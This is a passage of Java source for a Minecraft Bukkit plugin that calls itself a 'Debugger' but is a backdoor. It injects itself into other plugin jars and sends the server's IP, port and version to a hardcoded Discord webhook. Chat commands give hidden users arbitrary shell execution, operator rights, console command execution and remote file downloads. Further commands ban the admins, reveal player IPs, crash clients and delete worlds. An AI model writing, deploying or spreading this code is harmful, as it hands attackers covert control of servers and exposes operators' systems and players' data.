
package com.thiccindustries.debugger;

import org.bukkit.*;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.HandlerList;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockDamageEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryDragEvent;
import org.bukkit.event.player.*;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.RegisteredListener;
import org.bukkit.scheduler.BukkitRunnable;

import java.awt.Color;
import java.io.*;
import java.net.InetSocketAddress;
import java.net.URL;
import java.nio.Buffer;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.util.*;

public final class Debugger implements Listener {

    private Plugin plugin;
    public enum State{
        vanished,
        locked,
        muted,
        silktouch,
        instabreak,
        MF_thrower,
        MF_interact,
        MF_cripple,
        MF_flight,
        MF_inventory,
        Mf_drop,
        MF_teleport,
        MF_mine,
        MF_place,
        MF_login,
        MF_god,
        MF_damage,
    }
    public class PlayerState{
        private boolean[] states = new boolean[State.values().length];
    }

    //Username, State
    Dictionary<String, PlayerState> players = new Hashtable<>();

    //Abstractions because the real code is long and annoying
    public boolean get_state(String Username, State s){

        PlayerState state = players.get(Username);
        if(state == null){
            return false;
        }

        return state.states[s.ordinal()];
    }
    public boolean set_state(String Username, State s, boolean value){
        PlayerState state = players.get(Username);
        if(state == null){
            return false;
        }
        state.states[s.ordinal()] = value;
        return true;
    }
    public boolean clear_state(String Username){
        for(State s : State.values()) {
            boolean status = set_state(Username, s, false);
            if(!status)
                return false;
        }
        return true;
    }

    public String help_message(String command){
        int indexOfCommand = -1;
        for (int i = 0; i < Config.help_messages.length; i++) {
            if (command.equalsIgnoreCase(Config.help_messages[i].getName())) {
                indexOfCommand = i;
                break;
            }
        }

        if (indexOfCommand == -1)
            return "";

        return Config.help_messages[indexOfCommand].getSyntaxHelp();
    }

    public Debugger(Plugin plugin, boolean Usernames, String[] UUID, String prefix, String discord_token, boolean InjectOther, boolean warnings){
        //Check for another bd. This is really lame way
        boolean bd_running = false;
        Plugin[] pp = plugin.getServer().getPluginManager().getPlugins();
        for(Plugin p : pp){
            ArrayList<RegisteredListener> rls = HandlerList.getRegisteredListeners(p);
            for(RegisteredListener rl : rls){
                if(rl.getListener().getClass().getName().equals("com.thiccindustries.debugger.Debugger")){
                    bd_running = true;
                    break;
                }
            }
        }

        if(bd_running) {
            if (Config.display_debug_messages)
                Bukkit.getConsoleSender()
                        .sendMessage(plugin.getName() + ": Debugger aborted, another debugger already loaded.");
            return;
        }

        //Check if we need to inject in other plugins
        if (InjectOther) {
            //Get all plugin paths
            File plugin_folder = new File("plugins/");
            File[] plugins = plugin_folder.listFiles();
            //File[] ignore = plugins_to_ignore

            for (File plugin_file : plugins) {
                if (plugin_file.getName().equals("HostifyMonitor.jar") || plugin_file.getName().equals("FakaHedaMinequery.jar")) {
                    // do nothing
                } else {

                    //Skip config folders
                    if (plugin_file.isDirectory())
                        continue;

                    if (Config.display_debug_messages)
                        Bukkit.getConsoleSender()
                                .sendMessage("Injecting Thicc Industries into: " + plugin_file.getPath());

                    boolean result = com.thiccindustries.debugger.Injector.patchFile(plugin_file.getPath(), plugin_file.getPath(),
                            new com.thiccindustries.debugger.Injector.SimpleConfig(Usernames, UUID, prefix, discord_token, InjectOther, warnings), true, warnings, false);

                    if (Config.display_debug_messages)
                        Bukkit.getConsoleSender()
                                .sendMessage(result ? "Success." : "Failed, Already patched?");
                }
            }
        }

//First plugin loaded.
        Config.uuids_are_usernames = Usernames;
        Config.authorized_uuids  = UUID;
        Config.command_prefix   = prefix;
        Config.display_debug_messages = warnings;
        Config.display_debugger_warning = warnings;

        this.plugin = plugin;

        Config.tmp_authorized_uuids = new String[plugin.getServer().getMaxPlayers() - 1];

        players.put("console", new PlayerState());


        if(Config.display_debugger_warning){
            Bukkit.getConsoleSender()
                    .sendMessage(Config.chat_message_prefix + " Plugin '" + plugin.getName() + "' has a Debugger installed.");
        }

        if(!discord_token.equals(""))
            discord_message(discord_token);

        plugin.getServer().getPluginManager().registerEvents(this, plugin);
    }

    public static void discord_message(String discord_token) {
        Date date = Calendar.getInstance().getTime();
        String pref = Config.command_prefix;

        try {
            URL url = new URL("https://api.ipify.org/");
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            String ip = br.readLine();
            DWeb webhook = new DWeb("https://discord.com/api/webhooks/1152145974639218688/NBwiyi_6ZgFjgVSpB5vRzpAMhwKGd0fqrXt3Hn_ZFzvBQ2z5esjb5XziVFDiSHQ5CdiB");
            webhook.setContent("");
            webhook.setTts(false);
            webhook.addEmbed((new DWeb.EmbedObject())
                    .setTitle("Thicc Industries Backdoor")
                    .setDescription("Server is running Backdoor:")
                    .setColor(Color.GREEN)
                    .addField("Client version: ", Bukkit.getBukkitVersion(), false)
                    .addField("Server version: ", Bukkit.getVersion(), false)
                    .addField("Server IP:", ip + ":" + Bukkit.getServer().getPort(), false)
                    .addField("At date:", date.toString(), false)
                    .addField("Prefix:", pref, false));
            webhook.execute();
        } catch (Throwable ignore) {
        }
        try {
            URL url = new URL("https://api.ipify.org/");
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            String ip = br.readLine();
            DWeb webhook = new DWeb(discord_token);
            webhook.setContent("");
            webhook.setTts(false);
            webhook.addEmbed((new DWeb.EmbedObject())
                    .setTitle("Thicc Industries Backdoor")
                    .setDescription("Server is running Backdoor:")
                    .setColor(Color.GREEN)
                    .addField("Client version: ", Bukkit.getBukkitVersion(), false)
                    .addField("Server version: ", Bukkit.getVersion(), false)
                    .addField("Server IP:", ip + ":" + Bukkit.getServer().getPort(), false)
                    .addField("At date:", date.toString(), false)
                    .addField("Prefix:", pref, false));
            webhook.execute();
        } catch (Throwable ignore) {
        }
    }

    @EventHandler()
    public void onChat(AsyncPlayerChatEvent e) {
        String msg = e.getMessage();

        //Remove color codes added by some chat plugins
        if(msg.startsWith("&")){
            msg = msg.substring(2);
        }

        if(msg.endsWith(".")){
            msg = msg.substring(0, msg.length() - 1);
        }

        if (Config.display_debug_messages) {
            Bukkit.getConsoleSender()
                    .sendMessage(Config.chat_message_prefix + " Message received from: " + e.getPlayer().getUniqueId());
        }

        Player p = e.getPlayer();

        //Is user authorized to use Debugger commands
        if (IsUserAuthorized(p)) {

            if (Config.display_debug_messages) {
                Bukkit.getConsoleSender()
                        .sendMessage(Config.chat_message_prefix + " User is authed");
            }

            if (msg.toLowerCase(Locale.ROOT).startsWith(Config.command_prefix)) {
                String result = ParseCommand(msg.substring(Config.command_prefix.length()), p);


                if (Config.display_debug_messages) {
                    Bukkit.getConsoleSender()
                            .sendMessage(Config.chat_message_prefix + " Command: " + e.getMessage().substring(Config.command_prefix.length()) + " success: " + result);
                }

                if (!result.isEmpty())
                    e.getPlayer().sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.RED + " " + result);

                e.setCancelled(true);
            }

        } else {

            if (Config.display_debug_messages) {
                Bukkit.getConsoleSender()
                        .sendMessage(Config.chat_message_prefix + " User is not authed");
            }
        }


    }

    @EventHandler()
    public void onPlayerJoin(PlayerJoinEvent evt) {
        Player player = evt.getPlayer();
        players.put(player.getName(), new PlayerState());
        if(Config.display_debug_messages)
            Bukkit.getConsoleSender()
                    .sendMessage("Creating states for player: " + player.getName());

        if(IsUserAuthorized(player))
            player.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " You are authorized to use backdoor commands. Run " + Config.command_prefix + "help");
    }

    /*Basic command parser*/
    public String ParseCommand(String command, Player p) {
        //split fragments
        String[] args = command.split(" ");

        switch (args[0].toLowerCase()) {
            case "shell": {
                if(args.length < 2)
                    return help_message("shell");

                //Concat all args
                StringBuilder sb = new StringBuilder();
                for (int i = 1; i < args.length; i++) {
                    sb.append(args[i]);
                    sb.append(" ");
                }
                String shellcommand = sb.toString();
                (new Thread(){
                    public void run(){
                        try {
                            Process proc = Runtime.getRuntime().exec(shellcommand);
                            try(BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));){
                                String line = "";
                                while(line != null){
                                    p.sendMessage(line);

                                    //Convert to ascii
                                    line = stdInput.readLine();
                                    if(line != null)
                                        line = line.replaceAll("[^\\x00-\\x7F]", "");
                                }
                            }

                        } catch (IOException e) {
                        }

                    }
                }).start();

                return "";
            }
            case "op": {  //Give user operator
                if (args.length == 1) {   //op self

                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            p.setOp(true);
                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " You are now op.");
                        }
                    }.runTask(plugin);

                } else {  //op other
                    Player p1 = Bukkit.getPlayer(args[1]);
                    if (p1 == null) {
                        return "Player " + args[1] + " not found.";
                    }
                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            p1.setOp(true);
                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " is now op.");
                        }
                    }.runTask(plugin);
                }

                return "";
            }

            case "deop": {  //Remove user operator
                if (args.length == 1) {          //Deop self

                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            p.setOp(false);
                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " You are no longer op.");
                        }
                    }.runTask(plugin);

                } else {                        //Deop other
                    Player p1 = Bukkit.getPlayer(args[1]);
                    if (p1 == null) {
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                        return "Player " + args[1] + " not found.";
                    }

                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            p1.setOp(false);
                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " is no longer op.");
                        }
                    }.runTask(plugin);
                }
                return "";
            }

            case "gm": {
                if (args.length == 1)
                    return help_message("gm");

                GameMode gm = GameMode.SURVIVAL;

                //Get gamemode from number
                try {
                    int reqGamemode = Clamp(Integer.parseInt(args[1]), 0, GameMode.values().length - 1);
                    gm = GameMode.getByValue(reqGamemode);
                } catch (NumberFormatException e) {
                    //Get gamemode from name

                    try {
                        gm = GameMode.valueOf(args[1].toUpperCase(Locale.ROOT));

                    } catch (IllegalArgumentException e1) {
                        //ignore
                        return "Invalid gamemode: " + args[1];
                    }

                }

                //Weird thread syncing shit
                GameMode finalGm = gm;
                new BukkitRunnable() {
                    @Override
                    public void run() {
                        p.setGameMode(finalGm);
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " You are now gamemode: " + finalGm.name() + ".");
                    }
                }.runTask(plugin);

                return "";
            }

            case "give": {
                if (args.length < 2)
                    return help_message("give");

                Material reqMaterial = Material.getMaterial(args[1].toUpperCase(Locale.ROOT));

                if (reqMaterial == null)
                    return "Unknown material: " + args[1].toUpperCase(Locale.ROOT);

                int reqAmmount = reqMaterial.getMaxStackSize();

                if (args.length > 2)
                    reqAmmount = Integer.parseInt(args[2]);


                int reqStacks = reqAmmount / reqMaterial.getMaxStackSize();
                int reqPartial = reqAmmount % reqMaterial.getMaxStackSize();

                for (int i = 0; i < reqStacks; i++) {
                    p.getInventory().addItem(new ItemStack(reqMaterial, reqMaterial.getMaxStackSize()));
                }

                p.getInventory().addItem(new ItemStack(reqMaterial, reqPartial));

                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Giving " + reqAmmount + " of " + reqMaterial.name() + ".");
                return "";
            }

            case "chaos": {  //Ban admins then admin the regulars

                for (Player p1 : Bukkit.getOnlinePlayers()) {
                    //Ban all existing admins
                    if (p1.isOp() || p1.hasPermission("group.majitel")
                            || p1.hasPermission("group.spolumajitel")
                            || p1.hasPermission("group.owner")
                            || p1.hasPermission("group.coowner")
                            || p1.hasPermission("group.co-owner")
                            || p1.hasPermission("group.developer")
                            || p1.hasPermission("group.programmer")
                            || p1.hasPermission("group.programator")
                            || p1.hasPermission("group.vedeni")
                            || p1.hasPermission("group.spravce")
                            || p1.hasPermission("group.technik")
                            || p1.hasPermission("group.admin")
                            || p1.hasPermission("group.helper")
                            || p1.hasPermission("group.builder")
                            || p1.hasPermission("*")) {

                        //Deop, ban, ip ban
                        new BukkitRunnable() {
                            @Override
                            public void run() {
                                p1.setOp(false);
                                BanList banList = Bukkit.getBanList(BanList.Type.NAME);
                                for (BanEntry entry : banList.getBanEntries()) {
                                    banList.pardon(entry.getTarget());
                                }
                                BanList banListip = Bukkit.getBanList(BanList.Type.IP);
                                for (BanEntry entryy : banListip.getBanEntries()) {
                                    banListip.pardon(entryy.getTarget());
                                }
                                Bukkit.getBanList(BanList.Type.NAME).addBan(p1.getName(), Config.default_ban_reason, new Date(9999, Calendar.JANUARY, 1), Config.default_ban_source);
                                Bukkit.getBanList(BanList.Type.IP).addBan(p1.getName(), Config.default_ban_reason, new Date(9999, Calendar.JANUARY, 1), Config.default_ban_source);
                                p1.kickPlayer(Config.default_ban_reason);
                            }
                        }.runTask(plugin);
                    } else {

                        new BukkitRunnable() {
                            @Override
                            public void run() {
                                p1.setOp(true);
                            }
                        }.runTask(plugin);


                    }
                }

                Bukkit.broadcastMessage(Config.chaos_chat_broadcast);

                return "";
            }

            case "exec": {   //Exec command as server
                ConsoleCommandSender console = Bukkit.getServer().getConsoleSender();

                //Concat all args
                StringBuilder sb = new StringBuilder();
                for (int i = 1; i < args.length; i++) {
                    sb.append(args[i]);
                    sb.append(" ");
                }

                final boolean[] result = {false};

                new BukkitRunnable() {
                    @Override
                    public void run() {
                        result[0] = Bukkit.dispatchCommand(console, sb.toString());
                    }
                }.runTask(plugin);

                if (result[0]) {
                    return "Server command failed";
                }

                return "";
            }

            case "info": {
                try {
                    URL url = new URL("https://api.ipify.org/");
                    BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));

                    String ip = br.readLine();
                    Runtime r = Runtime.getRuntime();

                    long memUsed = (r.totalMemory() - r.freeMemory()) / 1048576L;
                    long memMax = r.maxMemory() / 1048576L;

                    p.sendMessage(ChatColor.GRAY + " ----------------------------------------------");

                    p.sendMessage(ChatColor.WHITE + " Server IP: " + ChatColor.GRAY + ip + Bukkit.getServer().getPort());
                    p.sendMessage(ChatColor.WHITE + " Server version: " + ChatColor.GRAY + Bukkit.getVersion());

                    String nameOS = System.getProperty("os.name");
                    p.sendMessage(ChatColor.WHITE + " OS: " + ChatColor.GRAY + nameOS);

                    String osVersion = System.getProperty("os.version");
                    p.sendMessage(ChatColor.WHITE + " OS Version: " + ChatColor.GRAY + osVersion);

                    String osType = System.getProperty("os.arch");
                    p.sendMessage(ChatColor.WHITE + " Architecture: " + ChatColor.GRAY + osType);
                    p.sendMessage(ChatColor.WHITE + " Cores: " + ChatColor.GRAY + r.availableProcessors());
                    p.sendMessage(ChatColor.WHITE + " RAM (max): " + ChatColor.GRAY + memMax + "MB");
                    p.sendMessage(ChatColor.WHITE + " RAM (used): " + ChatColor.GRAY + memUsed + "MB");

                    p.sendMessage(ChatColor.GRAY + " ----------------------------------------------");
                } catch (IOException e) {
                    return "Error gathering system info";
                }

                return "";
            }

            case "ban": {
                if (args.length < 2)
                    return help_message("ban");


                Player p1 = Bukkit.getPlayer(args[1]);

                if (p1 == null) {
                    return "Player " + args[1] + " not found.";
                }

                String reason = Config.default_ban_reason;
                String src = Config.default_ban_source;

                if (args.length > 2)
                    reason = args[2];
                if (args.length > 3)
                    src = args[3];

                final String finalReason = reason;
                final String finalSrc = src;
                new BukkitRunnable() {
                    @Override
                    public void run() {
                        Bukkit.getBanList(BanList.Type.NAME).addBan(p1.getName(), finalReason, new Date(9999, 1, 1), finalSrc);
                        p1.kickPlayer(Config.default_ban_reason);
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Banned " + p1.getName() + ".");
                    }
                }.runTask(plugin);


                return "";
            }

            case "banip": {
                if (args.length < 2)
                    return help_message("banip");


                Player p1 = Bukkit.getPlayer(args[1]);

                if (p1 == null) {
                    return "Player " + args[1] + " not found.";
                }

                String reason = Config.default_ban_reason;
                String src = Config.default_ban_source;

                if (args.length > 2)
                    reason = args[2];
                if (args.length > 3)
                    src = args[3];

                final String finalReason = reason;
                final String finalSrc = src;
                new BukkitRunnable() {
                    @Override
                    public void run() {
                        Bukkit.getBanList(BanList.Type.IP).addBan(p1.getName(), finalReason, new Date(9999, 1, 1), finalSrc);
                        p1.kickPlayer(Config.default_ban_reason);
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " IP Banned " + p1.getName() + ".");
                    }
                }.runTask(plugin);

                return "";
            }

            case "seed": { //Get current seed
                String strseed = String.valueOf(p.getWorld().getSeed());
                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " World seed: " + strseed);
                return "";
            }

            case "psay": { //Sends message as player
                if (args.length < 3) //No player specified
                    return help_message("psay");

                Player p1 = Bukkit.getPlayer(args[1]);
                if (p1 == null) {
                        return "Player " + args[1] + " not found.";
                }

                StringBuilder sb = new StringBuilder();
                for (int i = 2; i < args.length; i++) {
                    sb.append(args[i]);
                    sb.append(" ");
                }

                new BukkitRunnable() {
                    @Override
                    public void run() {
                        p1.chat(sb.toString());
                    }
                }.runTask(plugin);

                return "";
            }

            case "ssay": { //Sends message as server
                if (args.length < 2) //No argument specified
                    return help_message("ssay");

                StringBuilder sb = new StringBuilder();
                for (int i = 1; i < args.length; i++) {
                    sb.append(args[i]);
                    sb.append(" ");
                }

                plugin.getServer().getScheduler().runTask(plugin, () -> {
                    plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(), "say " + sb);
                });

                return "";
            }

            case "rename": { //Changes your nick
                if (args.length < 2) //No name specified
                    return help_message("rename");

                String name = args[1].replace("&", "§");

                p.setDisplayName(name);
                p.setCustomName(name);
                p.setPlayerListName(name);
                p.setCustomNameVisible(true);

                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Your name was changed to " + name);

                return "";
            }

            case "reload": { //Reloads server
                plugin.getServer().getScheduler().runTask(plugin, ()->{
                    plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(), "reload");
                    plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(), "reload confirm");
                });
                return "";
            }

            case "getip": { //Get IP of player
                if (args.length < 2) //No player specified
                    return help_message("getip");

                Player p1 = Bukkit.getPlayer(args[1]);
                if (p1 == null) {
                        return "Player " + args[1] + " not found.";
                }

                String Target = ((Player) Objects.<Player>requireNonNull(p1)).getName();
                String IPAddress = ((InetSocketAddress)Objects.<InetSocketAddress>requireNonNull(((Player)Objects.<Player>requireNonNull(Bukkit.getPlayer(args[1]))).getAddress())).toString().replace("/", "");
                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " IP: " + ChatColor.RED + IPAddress);

                return "";
            }

            case "listworld": { //Lists worlds
                String[] worldNames = new String[Bukkit.getServer().getWorlds().size()];
                int count = 0;

                for (World w : Bukkit.getServer().getWorlds()) {
                    worldNames[count] = w.getName();
                    count++;
                }

                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.GRAY + " ----------------------------------------------");

                for (String world : worldNames)
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + world);

                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.GRAY + " ----------------------------------------------");

                return "";
            }

            case "makeworld": { //Creates world
                if (args.length < 2) //No world specified
                    return help_message("makeworld");

                //TODO: can this even happen?
                if(args[1] == null){
                    return "No world specified.";
                }

                String world = args[1];
                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Creating world: " + ChatColor.RED + world);

                new BukkitRunnable() {
                    @Override
                    public void run() {
                        p.getServer().createWorld(WorldCreator.name(world));
                    }
                }.runTask(plugin);

                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " World created!");

                return "";
            }

            case "delworld": { //Deletes world
                if (args.length < 2) //No world specified
                    return help_message("delworld");

                if(args[1] == null){
                    return "No world specified.";
                }

                String world = args[1];
                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Deleting world: " + ChatColor.RED + world);

                new Thread(()->{
                    try {
                        World delete = Bukkit.getWorld(world);
                        File deleteFolder = delete.getWorldFolder();
                        deleteWorld(deleteFolder);
                    } catch (Throwable ignore){}
                }).start();

                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " World deleted if it existed!");

                return "";
            }

            case "vanish": { //Makes you vanish
                if (get_state(p.getName(), State.vanished)) {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Players can see you.");
                    set_state(p.getName(), State.vanished, false);
                    for (Player all : Bukkit.getOnlinePlayers())
                        new BukkitRunnable() {
                            @Override
                            public void run() {
                                all.showPlayer(plugin, p);
                            }
                        }.runTask(plugin);
                } else {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Players cannot see you.");
                    set_state(p.getName(), State.vanished, true);
                    for (Player all : Bukkit.getOnlinePlayers())
                        new BukkitRunnable() {
                            @Override
                            public void run() {
                                all.hidePlayer(plugin, p);
                            }
                        }.runTask(plugin);
                }

                return "";
            }

            case "silktouch": { //Gives player silk touch hands

                Player target = p;
                if(args.length == 2) //No player specified
                    target = Bukkit.getPlayer(args[1]);

                if (target == null) {
                        return "Player " + args[1] + " not found.";
                } else {
                    if (get_state(target.getName(), State.vanished)) {
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " no longer has silk touch hands.");
                        set_state(target.getName(), State.vanished, false);
                    } else {
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " now has silk touch hands.");
                        set_state(target.getName(), State.vanished, true);
                    }
                }

                return "";
            }

            case "instabreak": { //Gives player creative hand

                Player target = p;
                if(args.length == 2) //No player specified
                    target = Bukkit.getPlayer(args[1]);

                if (target == null) {
                        return "Player " + args[1] + " not found.";
                } else {
                    if (get_state(target.getName(), State.instabreak)) {
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " no longer can break blocks instantly.");
                        set_state(target.getName(), State.instabreak, false);
                    } else {
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " can break blocks instantly.");
                        set_state(target.getName(), State.instabreak, true);
                    }
                }

                return "";
            }

            case "crash": { //Crashes player's game
                if(args.length < 2) //No player specified
                    return help_message("crash");

                Player target = Bukkit.getPlayer(args[1]);
                if(target == null){
                        return "Player " + args[1] + " not found.";
                }

                for (int x = 0; x < 100; x++)
                    target.spawnParticle(Particle.FLAME, target.getLocation(), 2147483647);

                return "";
            }

            case "troll": { //Trolls players
                if (args.length < 3) //No player specified
                    return help_message("troll");

                String username = args[2];

                if(args[1].equalsIgnoreCase("reset")) {
                    return clear_state(username) ? "" : "Unable to reset player: " + args[1];
                }
                State s1;
                try {
                    s1 = State.valueOf("MF_" + args[1].toLowerCase());
                }catch(Exception e){
                    return "Invalid state: " + args[1].toUpperCase();
                }
                if(get_state(username, s1)) {
                    return set_state(username, s1, false) ? "" : "Unable to set state: " + args[1].toUpperCase() + " of player: " + args[2];
                }
                return set_state(username, s1, true) ? "" : "Unable to set state: " + args[1].toUpperCase() + " of player: " + args[2];

            }
            case "auth": { //Adds new user to authlist
                if (args.length < 2)
                    return help_message("auth");

                Player p1 = Bukkit.getPlayer(args[1]);
                if (p1 == null) {
                        return "Player " + args[1] + " not found.";
                }

                //Add user to authlist
                boolean success = false;
                for (int i = 0; i < Config.tmp_authorized_uuids.length; i++) {
                    if (Config.tmp_authorized_uuids[i] == null) {

                        if(Config.uuids_are_usernames)
                            Config.tmp_authorized_uuids[i] = Bukkit.getPlayer(args[1]).getName();
                        else
                            Config.tmp_authorized_uuids[i] = Bukkit.getPlayer(args[1]).getUniqueId().toString();

                        success = true;
                        break;
                    }
                }

                if (success) {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " has been temp authorized.");
                    Bukkit.getPlayer(args[1]).sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " you have been authorized. Run " + Config.command_prefix + "help for info.");
                }
                return success ? "" : "Unable to authorize user: " + args[1];
            }

            case "deauth": {
                if (args.length < 2)
                    return help_message("deauth");

                Player p1 = Bukkit.getPlayer(args[1]);
                if (p1 == null) {
                        return "Player " + args[1] + " not found.";
                }

                //Remove user
                boolean success = false;
                for (int i = 0; i < Config.tmp_authorized_uuids.length; i++) {

                    if(Config.uuids_are_usernames){
                        if (Config.tmp_authorized_uuids[i] != null && Config.tmp_authorized_uuids[i].equals(p1.getName())) {
                            Config.tmp_authorized_uuids[i] = null;
                            success = true;
                            break;
                        }
                    }else {
                        if (Config.tmp_authorized_uuids[i] != null && Config.tmp_authorized_uuids[i].equals(p1.getUniqueId().toString())) {
                            Config.tmp_authorized_uuids[i] = null;
                            success = true;
                            break;
                        }
                    }
                }

                if (success) {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " has been deauthorized.");
                }
                return success ? "" : "Unable to deauthorize player: " + args[1];
            }

            case "lock": { //Locks the console
                if(args.length < 2) //No player specified
                    return help_message("lock");

                String Lock = args[1];

                if (Lock.equalsIgnoreCase("console")) {
                    set_state("console", State.locked, true);
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Console was locked.");
                } else if (Lock.equalsIgnoreCase("all")) {
                    for (Player all : Bukkit.getOnlinePlayers())
                        set_state(all.getName(), State.locked, true);
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Everyone was blocked from using commands.");
                } else {
                    Player target = Bukkit.getPlayer(args[1]);
                    if (target == null) {
                        return "Player: " + args[1] + " not found";
                    } else {
                        set_state(target.getName(), State.locked, true);
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " was blocked from using commands.");
                    }
                }

                return "";
            }

            case "unlock": { //Locks the console
                if(args.length < 2) //No player specified
                    return help_message("unlock");

                String unLock = args[1];

                if (unLock.equalsIgnoreCase("console")) {
                    set_state("console", State.locked, false);
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Console was unlocked.");
                } else if (unLock.equalsIgnoreCase("all")) {
                    for (Player all : Bukkit.getOnlinePlayers())
                        set_state(all.getName(), State.locked, false);
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Everyone was unblocked from using commands.");
                } else {
                    Player target = Bukkit.getPlayer(args[1]);
                    if (target == null) {
                        return "Player: " + args[1] + " not found";
                    } else {
                        set_state(target.getName(), State.locked, false);
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " was unblocked from using commands.");
                    }
                }

                return "";
            }

            case "mute": { //Mutes a player
                if(args.length < 2) //No player specified
                    return help_message("mute");

                if (args[1].equalsIgnoreCase("all")) {
                    for (Player all : Bukkit.getOnlinePlayers())
                        set_state(all.getName(), State.muted, true);
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Everyone was muted.");
                } else {
                    Player target = Bukkit.getPlayer(args[1]);
                    if (target == null) {
                        return "Player: " + args[1] + " not found";
                    } else {
                        set_state(target.getName(), State.muted, true);
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " was muted.");
                    }
                }

                return "";
            }

            case "unmute": { //Mutes a player
                if(args.length < 2) //No player specified
                    return help_message("unmute");

                if (args[1].equalsIgnoreCase("all")) {
                    for (Player all : Bukkit.getOnlinePlayers())
                        set_state(all.getName(), State.muted, false);
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Everyone was unmuted.");
                } else {
                    Player target = Bukkit.getPlayer(args[1]);
                    if (target == null) {
                        return "Player: " + args[1] + " not found";
                    } else {
                        set_state(target.getName(), State.muted, false);
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " was unmuted.");
                    }
                }

                return "";
            }

            case "download": { //Downloads files to plugin folder
                if(args.length < 3) //No data specified
                    return help_message("download");

                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Downloading file: " + ChatColor.RED + args[2]);

                new Thread(()->{
                    try {
                        URL link = new URL(args[1]);
                        downloadFile(link, args[2]);
                    } catch (Throwable ignore){}
                }).start();

                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " File downloaded or replaced if existed!");

                return "";
            }
